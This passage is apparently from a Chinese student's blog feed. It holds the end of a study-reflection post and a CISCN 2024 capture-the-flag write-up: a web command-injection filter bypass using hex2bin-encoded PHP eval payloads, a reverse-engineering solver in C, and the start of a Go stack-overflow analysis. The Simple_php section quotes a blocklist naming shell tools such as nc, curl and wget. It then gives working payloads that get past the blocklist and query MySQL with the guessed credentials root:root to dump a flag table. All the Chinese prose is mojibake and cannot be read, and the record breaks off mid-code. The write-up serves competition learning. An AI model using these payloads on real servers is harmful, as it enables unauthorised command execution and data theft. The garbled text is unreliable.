¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå½“æ—¶æ²¡å­¦å¤šå°‘çš„æ„Ÿè§‰ï¼Œå¾—å†å¤ä¹ ä¸€æ‰‹ã€‚</li><li>æ ˆè¿ç§»å’Œæ²™ç®±ï¼ŒHN ç»™æˆ‘æ‰“äº†ä¸ªæªæ‰‹ä¸åŠï¼Œä¸€æ‰‹æ ˆè¿ç§»å½“åœºä¸ä¼šäº†ã€‚</li><li>æ²™ç®±çš„ orw å’Œ sropï¼Œæ„Ÿè§‰ä¸‹å­¦æœŸæ ¡èµ›å‡ºé¢˜å¯èƒ½ä¼šç”¨åˆ°è¿™ä¸ªç‚¹ï¼Œéœ€è¦æä¸€æ‰‹ã€‚</li><li>ä¹‹åå°±æ˜¯é‡é‡çº§çš„å †äº†ï¼Œå¦‚ä»Šæˆ‘æ‰åˆšå…¥é—¨å †ï¼Œç”šè‡³åªèƒ½è¯´æ˜¯ï¼Œä¸å †æ‰“äº†ä¸ªæ“¦è¾¹çƒï¼Œå®Œå…¨ä¸ä¼šå †ï¼Œå †çš„ç‚¹éœ€è¦æ³¨æ„ï¼š<ul><li>UAF , Double Free ,Off By One ,tcache attack ,unlink , unsorted bin attack , hook åŠ«æŒï¼Œhouse ç³»åˆ—ã€‚</li></ul></li></ul><h1 id="ç»“è¯­"><a class="markdownIt-Anchor" href="#ç»“è¯­">#</a> ç»“è¯­ï¼š</h1><p>â€‹æ„Ÿè§‰å¿«æœŸæœ«äº†ï¼Œä¹‹åå¯èƒ½ä¸­å¿ƒä¼šåœ¨æœŸæœ«ä¸Šï¼ŒæŠŠè¿™ä¸ªç§äººåšå®¢æ­å»ºèµ·æ¥ä¹‹åï¼Œå°±ä¼šèŠ±å¤§é‡æ—¶é—´åˆ°æœŸæœ«ä¸Šäº†ï¼Œè¿˜æœ‰å››çº§ï¼ŒäºŒæˆ˜å››çº§ï¼Œå‘œå‘œå‘œï¼ï¼ï¼</p><p>â€‹æ€»å¾—æ¥è¯´ï¼Œæˆ‘å¯¹æˆ‘è¿™ä¸ªå­¦æœŸçš„æ„Ÿè§‰ä¸æ˜¯å¾ˆæ»¡æ„ï¼ŒåŸºæœ¬ä¸Šéƒ½åœ¨æ‘†çƒ‚ã€æ‘¸é±¼ï¼Œæš‘å‡æˆ‘å¾—è¡¥å›æ¥ï¼Œä¸ç„¶ä¼šè·Ÿä¸ä¸Š V&amp;N çš„é‚£å †å¤§ç¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å‘ç”µæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciscn2024</title>
      <link href="/posts/9dd9bec.html"/>
      <url>/posts/9dd9bec.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h2><h3 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php">#</a> Simple_php</h3><p>â€‹è¿™ä¸ª Simple_php ä¸€ç‚¹å„¿ä¹Ÿä¸ Simple (â‹Ÿï¹â‹)<br>â€‹æºç æ”¾è¿™å„¿äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾ï¼ŒPOST ä¸€ä¸ª cmd è¿›å»ï¼Œç„¶åé€šè¿‡ escapeshellcmd å‡½æ•°å¯¹å‚æ•°è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åè¿›è¡Œé€†å¤©çš„æ­£åˆ™ï¼Œä¹‹å RCEã€‚<br>â€‹å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œè¿˜èƒ½å¹²å•¥ï¼Ÿå…¨éƒ½ç»™è¿‡æ»¤äº†ï¼Œè¿˜èƒ½å’‹ç»•è¿‡ï¼Ÿ<br>â€‹é¦–å…ˆæ˜¯ä¿¡æ¯æœé›†ï¼Œä¸è¿‡æœ‰ç”¨çš„ä¼¼ä¹æ²¡å¤šå°‘ï¼ŒæŸ¥çœ‹è¿›ç¨‹å‘ç°ä¸€ä¸ª MySQL çš„è¿›ç¨‹ï¼Œå¯ä»¥è¯•ç€æ‰“ä¸€ä¸‹ MySQLï¼š</p><blockquote><p>mysql        277  0.0 16.9 1083992 89076 pts/0   Sl+  07:38   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock</p></blockquote><p>â€‹çœ‹æ¥æ˜¯æ”»å‡» MySQL äº†ï¼ŒçŒœæµ‹ç”¨æˆ·æ˜¯ rootï¼Œå¯†ç éšä¾¿çŒœï¼Œè¿™é“é¢˜ä¹Ÿæ˜¯ rootï¼Œè¿æ°”å¥½ï¼ŒçŒœä¸­äº†ï¼Œé‚£ä¹ˆï¼Œå…ˆæŸ¥æ•°æ®åº“ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//æ„é€ è¿™ä¸ªæŸ¥è¯¢è¯­å¥</span><br><span class="line"><span class="built_in">echo</span> `mysql <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="literal">-e</span> <span class="string">&quot;SHOW DATABASES&quot;</span>`;</span><br><span class="line">//payload </span><br><span class="line">cmd=php+<span class="literal">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253484f572044415441424153455322603b,<span class="number">2</span>)));</span><br><span class="line">//ç»“æœ</span><br><span class="line">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c45435420534348454d415f4e414d45204153205048505f434d532046524f4d20494e464f524d4154494f4e5f534348454d412e534348454d4154413b22603b - assumed <span class="string">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c45435420534348454d415f4e414d45204153205048505f434d532046524f4d20494e464f524d4154494f4e5f534348454d412e534348454d4154413b22603b&#x27;</span> (this will <span class="keyword">throw</span> an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> Command line code on line <span class="number">1</span></span><br><span class="line">PHP_CMS</span><br><span class="line">information_schema</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line">PHP_CMS</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//æ„é€ è¿™ä¸ªæŸ¥è¯¢è¯­å¥</span><br><span class="line"><span class="built_in">echo</span> `mysql <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="literal">-e</span> <span class="string">&quot;select table_name as PHP_CMS from information_schema.TABLES where TABLE_SCHEMA=&#x27;PHP_CMS&#x27;&quot;</span>`;</span><br><span class="line">//payload </span><br><span class="line">cmd=php+<span class="literal">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b,<span class="number">2</span>)));</span><br><span class="line">//ç»“æœ</span><br><span class="line">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b - assumed <span class="string">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b&#x27;</span> (this will <span class="keyword">throw</span> an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> Command line code on line <span class="number">1</span></span><br><span class="line">PHP_CMS</span><br><span class="line">F1ag_Se3Re7</span><br></pre></td></tr></table></figure><p>â€‹æŸ¥ä¸€ä¸‹è¿™ä¸ª F1ag_Se3Re7ï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œåº”è¯¥ flag åœ¨è¿™é‡Œé¢ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//æ„é€ è¿™ä¸ªæŸ¥è¯¢è¯­å¥</span><br><span class="line"><span class="built_in">echo</span> `mysql <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="literal">-e</span> <span class="string">&quot;SELECT * FROM PHP_CMS.F1ag_Se3Re7&quot;</span>`;  </span><br><span class="line">//payload</span><br><span class="line">cmd=php+<span class="literal">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b,<span class="number">2</span>)));</span><br><span class="line">//ç»“æœ</span><br><span class="line">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b - assumed <span class="string">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b&#x27;</span> (this will <span class="keyword">throw</span> an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> Command line code on line <span class="number">1</span></span><br><span class="line">idf1ag66_2024</span><br><span class="line"><span class="number">1</span>flag&#123;e784d525<span class="literal">-93a1-466b-9f22-38a3add54dfe</span>&#125;</span><br></pre></td></tr></table></figure><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e784d525-93a1-466b-9f22-38a3add54dfe&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¡¥å……ï¼š</p><blockquote><p>1. å› ä¸ºå­˜åœ¨ escapeshellcmd å‡½æ•°ï¼Œæ‰€ä»¥åœ¨è½¬ä¹‰ä¹‹åï¼Œåœ¨ system å‡½æ•°ä¸­ï¼Œ&quot;åœ¨ç»è¿‡ hex2bin ä¹‹åï¼Œå°±èƒ½å¤Ÿè¡¨ç¤ºå­—ç¬¦ä¸²&quot; æœ¬èº«<br> 2. åœ¨æ„é€  substr çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ²¡æœ‰å¼•å·ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œåªæ˜¯ä¼šå‡ºç°ä¸€ä¸ªæŠ¥é”™</p></blockquote><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re</h2><h3 id="asm_re"><a class="markdownIt-Anchor" href="#asm_re">#</a> asm_re</h3><p>ex<br> æ•°æ®æ®µï¼Œæ•°æ®æ®µåˆ†é…å†…å­˜ï¼Œæ¯ä¸€ä¸ªæ•°æ®æ®µä¼šè·å¾— 2 ä¸ªå†…å­˜å•å…ƒ<br>è®¡ç®—æœºé‡‡ç”¨å°ç«¯å­˜å‚¨ï¼Œå°ç«¯å­—èŠ‚åºå­˜å‚¨ï¼šæŠŠä¸€ä¸ªæ•°æ®çš„ä½ä½å­—èŠ‚çš„å†…å®¹ï¼Œå­˜å‚¨åœ¨ä½åœ°å€å¤„ï¼ŒæŠŠé«˜ä½å­—èŠ‚çš„å†…å®¹ï¼Œå­˜å‚¨åœ¨é«˜åœ°å€å¤„ï¼›<br>æ•°æ®æ®µï¼šå­˜æ”¾æ•°æ®çš„æ®µã€‚ä½¿ç”¨æ—¶å€™ï¼Œç”¨ DS å¯„å­˜å™¨<br>å¤§äºä¸€ä¸ªå­—èŠ‚é•¿åº¦çš„ 16<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTUlODglQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw"> è¿›åˆ¶</span>æ•°æ®è¿›è¡Œé«˜ä½ä½åˆ†å‰²ä¹‹åè¿›è¡Œä¼ è¾“<br><img data-src="https://img-blog.csdnimg.cn/img_convert/9bd76a5d388c6179608478ae4475a8c9.png" alt="image.png"><br>DCBï¼šç”¨äºåˆ†é…ä¸€ç‰‡è¿ç»­çš„å­—èŠ‚å­˜å‚¨å•å…ƒå¹¶ç”¨æŒ‡å®šçš„æ•°æ®åˆå§‹åŒ–<br> DCB è¡¨ç¤ºï¼šå®ƒåˆ†é…ä¸€æ®µå­—èŠ‚çš„å†…å­˜å•å…ƒï¼Œå®ƒæ¯ä¸ªæ“ä½œæ•°éƒ½å æœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œæ“ä½œæ•°èŒƒå›´ä¸º - 128ï½255 çš„æ•°å€¼æˆ–å­—ç¬¦ä¸²ã€‚<br>å…³é”®éƒ¨åˆ†<br><img data-src="https://img-blog.csdnimg.cn/img_convert/a2e84faa2cc3dfc118736c6fdc18b8b3.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> data[] =  &#123;<span class="number">0x1FD7</span>, <span class="number">0x21B7</span>, <span class="number">0x1E47</span>, <span class="number">0x2027</span>, <span class="number">0x26E7</span>, <span class="number">0x10D7</span>, <span class="number">0x1127</span>, <span class="number">0x2007</span>, <span class="number">0x11c7</span>, <span class="number">0x1e47</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>,</span><br><span class="line">                   <span class="number">0x11f7</span>, <span class="number">0x2007</span>, <span class="number">0x1037</span>, <span class="number">0x1107</span>, <span class="number">0x1f17</span>, <span class="number">0x10d7</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x1f67</span>, <span class="number">0x1017</span>, <span class="number">0x11c7</span>, <span class="number">0x11c7</span>, <span class="number">0x1017</span>,</span><br><span class="line">                   <span class="number">0x1fd7</span>, <span class="number">0x1f17</span>, <span class="number">0x1107</span>, <span class="number">0xf47</span>, <span class="number">0x1127</span>, <span class="number">0x1037</span>, <span class="number">0x1e47</span>, <span class="number">0x1037</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x2787</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    len=<span class="keyword">sizeof</span>(data)/<span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;len;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">32</span>;i&lt;<span class="number">128</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((((i*<span class="number">0x50</span>+<span class="number">0x14</span>)^<span class="number">0x4D</span>)+<span class="number">0x1E</span>)==data[j])</span><br><span class="line">            &#123;</span><br><span class="line">                flag[index++]=(<span class="type">char</span>)i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    flag[index]=<span class="string">&#x27;\0&#x27;</span>;<span class="comment">//charå‹</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="comment">//flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2><h3 id="gostackå¤ç°"><a class="markdownIt-Anchor" href="#gostackå¤ç°">#</a> gostackï¼ˆå¤ç°ï¼‰:</h3><p>go è¯­è¨€çš„æ ˆæº¢å‡ºï¼Œæ²¡é‡åˆ°è¿‡ï¼Œèµ›åå¤ç°ä¸‹ï¼Œçœ‹çœ‹èƒ½å¦å¹²å‡ºæ¥ã€‚<br>é¦–å…ˆæ˜¯æ£€æŸ¥ä¿æŠ¤ï¼Œä¸è¿‡ 64 ä½ï¼Œå‡ºäº† NX ä¹‹å¤–æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œé‚£å°±ç®€å•ä¸å°‘ï¼Œæ‹–åˆ° IDA é‡Œçœ‹çœ‹ï¼Œå¾ˆè½»æ¾å°±èƒ½æ‰¾åˆ° mainmainï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// main.main</span><br><span class="line">void __fastcall main_main()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // r14</span><br><span class="line">  void *retaddr; // [<span class="type">rsp</span>+<span class="number">8</span><span class="type">h</span>] [<span class="type">rbp</span>+<span class="number">0</span><span class="type">h</span>] BYREF</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (unsigned __int64)&amp;retaddr &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  main_main_func1();</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)main_main_func3() )</span><br><span class="line">    main_main_func2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™ä¸ªå¾ˆæ˜æ˜¾ï¼Œæœ‰ç‚¹çœ‹ä¸æ‡‚ï¼Œæ¯•ç«Ÿæ²¡æ¥è§¦è¿‡ go è¯­è¨€ï¼Œé‚£ä¹ˆï¼Œå…ˆç›´æ¥è¿è¡Œä¸‹çœ‹çœ‹ç¨‹åºæ˜¯å•¥æƒ…å†µï¼Ÿï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@g01den<span class="literal">-virtual-machine</span>:/mnt/shared<span class="comment"># ./pwn</span></span><br><span class="line">Welcome to CISCN!</span><br><span class="line">Happy magic golang!</span><br><span class="line">Input your magic message :</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaa</span><br><span class="line">Your magic message :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaa</span><br></pre></td></tr></table></figure><p>å°±ç»“æŸäº†ï¼Œæ²¡äº†ï¼Œæ„Ÿè§‰å¾ˆç®€å•ï¼Œæœ‰è¾“å…¥ï¼Œä½†æ˜¯åªæœ‰ä¸€æ¬¡å†™å…¥ã€‚<br>è¿™ä¸ªè¿è¡Œé‡Œç»™äº†ä¸€éƒ¨åˆ†ä¿¡æ¯ï¼Œé‚£ä¹ˆå‡­å€Ÿè¿™äº›ä¿¡æ¯å¾ˆè½»æ¾å°±æ‰¾åˆ°äº†ä¸»è¦éƒ¨åˆ†å‡½æ•°çš„åœ°æ–¹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">// main.main.func3</span><br><span class="line">__int64 __golang main_main_func3(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // r14</span><br><span class="line">  __int128 v3; // xmm15</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  __int64 v6; // rdx</span><br><span class="line">  int v7; // r11d</span><br><span class="line">  int v8; // ebx</span><br><span class="line">  int v9; // r11d</span><br><span class="line">  int v10; // ecx</span><br><span class="line">  int v11; // r8d</span><br><span class="line">  int v12; // r9d</span><br><span class="line">  int v13; // r10d</span><br><span class="line">  int v14; // r11d</span><br><span class="line">  __int64 v15; // rbx</span><br><span class="line">  int v16; // r8d</span><br><span class="line">  int v17; // r9d</span><br><span class="line">  int v18; // r10d</span><br><span class="line">  int v19; // r11d</span><br><span class="line">  int v20; // ecx</span><br><span class="line">  int v21; // r8d</span><br><span class="line">  int v22; // r9d</span><br><span class="line">  int v23; // r11d</span><br><span class="line">  char *v24; // rdx</span><br><span class="line">  unsigned __int8 *v25; // r10</span><br><span class="line">  __int64 i; // rax</span><br><span class="line">  __int64 v27; // rax</span><br><span class="line">  int v28; // r10d</span><br><span class="line">  int v29; // r11d</span><br><span class="line">  __int64 v31; // [<span class="type">rsp</span>+<span class="number">10</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">208</span><span class="type">h</span>]</span><br><span class="line">  __int64 v32; // [<span class="type">rsp</span>+<span class="number">10</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">208</span><span class="type">h</span>]</span><br><span class="line">  char v33[<span class="number">72</span>]; // [<span class="type">rsp</span>+<span class="number">48</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">1</span><span class="type">D0h</span>] BYREF</span><br><span class="line">  char v34; // [<span class="type">rsp</span>+<span class="number">90</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">188</span><span class="type">h</span>] BYREF</span><br><span class="line">  unsigned __int8 *v35; // [<span class="type">rsp</span>+<span class="number">148</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="type">D0h</span>]</span><br><span class="line">  __int64 v36; // [<span class="type">rsp</span>+<span class="number">150</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="type">C8h</span>]</span><br><span class="line">  __int128 v37; // [<span class="type">rsp</span>+<span class="number">158</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="type">C0h</span>] BYREF</span><br><span class="line">  _QWORD v38[<span class="number">2</span>]; // [<span class="type">rsp</span>+<span class="number">168</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="type">B0h</span>] BYREF</span><br><span class="line">  char *v39; // [<span class="type">rsp</span>+<span class="number">178</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="type">A0h</span>]</span><br><span class="line">  __int64 v40; // [<span class="type">rsp</span>+<span class="number">180</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">98</span><span class="type">h</span>]</span><br><span class="line">  __int64 v41; // [<span class="type">rsp</span>+<span class="number">188</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">90</span><span class="type">h</span>]</span><br><span class="line">  __int64 v42[<span class="number">4</span>]; // [<span class="type">rsp</span>+<span class="number">190</span><span class="type">h</span>] [<span class="type">rbp</span>-<span class="number">88</span><span class="type">h</span>] BYREF</span><br><span class="line">  __int64 v43; // [<span class="type">rsp</span>+<span class="number">1</span><span class="type">B0h</span>] [<span class="type">rbp</span>-<span class="number">68</span><span class="type">h</span>]</span><br><span class="line">  __int64 v44; // <span class="function">[<span class="type">rsp</span>+<span class="number">1</span><span class="type">B8h</span>] [<span class="type">rbp</span>-<span class="number">60</span><span class="type">h</span>]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (unsigned __int64)&amp;v34 &lt;= *(_QWORD *)(v2 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v4 = ((__int64 (__fastcall *)(char *))loc_4606F4)(v33);</span><br><span class="line">  v39 = v33;</span><br><span class="line">  v40 = <span class="number">256</span>LL;</span><br><span class="line">  v41 = <span class="number">256</span>LL;</span><br><span class="line">  ((void (__golang *)(__int64, __int64, __int64, __int64 *))loc_460722)(v4, a2, v5, v42);</span><br><span class="line">  v42[<span class="number">0</span>] = (__int64)off_4DF4E8;</span><br><span class="line">  v42[<span class="number">1</span>] = v6;</span><br><span class="line">  v42[<span class="number">2</span>] = (__int64)&amp;off_4C5DD0;</span><br><span class="line">  v42[<span 